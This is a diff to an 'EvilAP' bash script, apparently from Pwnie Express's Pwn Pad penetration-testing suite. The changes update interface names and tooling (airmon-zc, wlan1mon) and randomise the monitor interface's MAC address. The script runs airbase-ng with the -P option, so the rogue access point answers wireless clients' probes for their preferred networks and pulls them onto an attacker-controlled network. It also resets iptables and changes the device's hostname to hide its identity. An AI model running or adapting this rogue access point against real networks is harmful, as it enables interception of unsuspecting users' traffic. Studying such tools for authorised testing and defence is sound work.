@@ -1,7 +1,6 @@
 #!/bin/bash
-# Date: May 2014
-# Desc: EvilAP script to forcefully connect wireless clients
-# Authors: Awk, Sedd, Pasties, t1mz0r
+# Revision: March 2015
+# Author: t1mz0r, awk, sedd, pasties
 # Company: Pwnie Express
 
 trap f_endclean INT
@@ -12,10 +11,10 @@ f_identify_device(){
 # Check device
   hardw=`getprop ro.hardware`
   if [[ "$hardw" == "deb" || "$hardw" == "flo" ]]; then
-    # Set interface for new Pwn Pad
+    # Set interface for Pwn Pad 2
     gsm_int="rmnet_usb0"
   else
-    # Set interface for Pwn Phone and old Pwn Pad
+    # Set interface for Pwn Pad 1, Pwn Pad 3 and Pwn Phone
     gsm_int="rmnet0"
   fi
 }
@@ -32,7 +31,7 @@ f_clean_up(){
   echo "[-] Killing other instances of airbase or dhcpd"
   killall airbase-ng &> /dev/null
   killall dhcpd &> /dev/null
-  airmon-ng stop mon0 8> /dev/null
+  airmon-zc stop wlan1mon &> /dev/null
   iptables --flush
   iptables --table nat --flush
 }
@@ -40,7 +39,7 @@ f_clean_up(){
 f_restore_ident(){
   echo "[+] Restoring network identity"
   hostn=`cat /etc/hostname`
-  ifconfig wlan1 down
+  ifconfig wlan1 down &> /dev/null
   macchanger -p wlan1 &> /dev/null
   hostname $hostn
 }
@@ -120,17 +119,20 @@ f_preplaunch(){
   echo
 
   ifconfig wlan1 down
-  macchanger -r wlan1
 
   hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
   hostname $hn
   echo "[+] New hostname set: $hn"
 
   sleep 2
-  #Put wlan1 into monitor mode - mon0 created
-  airmon-ng start wlan1
-  mkdir /dev/net/
-  ln -s /dev/tun /dev/net/tun
+  #Put wlan1 into monitor mode - wlan1mon created
+  airmon-zc start wlan1
+  ifconfig wlan1mon down
+  macchanger -r wlan1mon
+  ifconfig wlan1mon up
+
+  mkdir /dev/net/ &> /dev/null
+  ln -s /dev/tun /dev/net/tun &> /dev/null
 }
 
 f_logname(){
@@ -143,7 +145,7 @@ f_evilap(){
   echo "[+] Creating new logfile: $logname"
 
   #Start Airbase-ng with -P for preferred networks
-  airbase-ng -P -C $brate -c $channel -e "$ssid" -v mon0 > $logname 2>&1 &
+  airbase-ng -P -C $brate -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
   sleep 2
 
   #Bring up virtual interface at0
@@ -165,7 +167,7 @@ f_niceap(){
   echo "[+] Creating new logfile: $logname"
 
   #Start Airbase-ng with -P for preferred networks
-  airbase-ng -c $channel -e "$ssid" -v mon0 > $logname 2>&1 &
+  airbase-ng -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
   sleep 2
 
   #Bring up virtual interface at0
